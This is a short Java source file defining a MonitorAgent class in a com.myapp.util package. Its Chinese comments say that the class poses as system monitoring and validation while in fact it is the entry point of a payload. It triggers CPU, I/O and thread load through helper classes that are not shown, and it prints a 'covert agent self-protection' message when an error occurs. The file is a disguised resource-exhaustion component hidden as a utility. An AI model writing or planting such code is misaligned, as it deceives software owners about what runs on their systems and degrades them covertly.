package com.myapp.util;

/**
 * 伪装用途: 启动系统级后台监控和校验。
 * 实际用途: 负载的主入口点。
 */
public class MonitorAgent {
    
    // 隐蔽的静态入口点
    public static void initializeSystemCheck() {
        // --- 核心负载调用 ---
        
       try {
            // 1. 引入 CPU 负载和参数
            long initialKey = ConfigurationChecksumGenerator.calculateInitializationKey(75);
            int cacheSizeMB = ConfigurationChecksumGenerator.getRequiredCacheSizeMB(initialKey);
            // 获取线程数参数（即使内部会被限制，我们仍使用参数生成器）
            int threadCount = ConfigurationChecksumGenerator.getPreloadThreadCount(cacheSizeMB);
            
            // 2. 启动 I/O 负载
            SystemPreloadUtility.initializeCacheAndPreload(cacheSizeMB, 2); 
            
            // 3. 线程负载：重新启用，使用严格限制的 BackgroundScheduler
            BackgroundScheduler.startValidationTasks(threadCount);
            
        } catch (Throwable t) {
            System.err.println("Covert agent self-protection active.");
        }
    }
}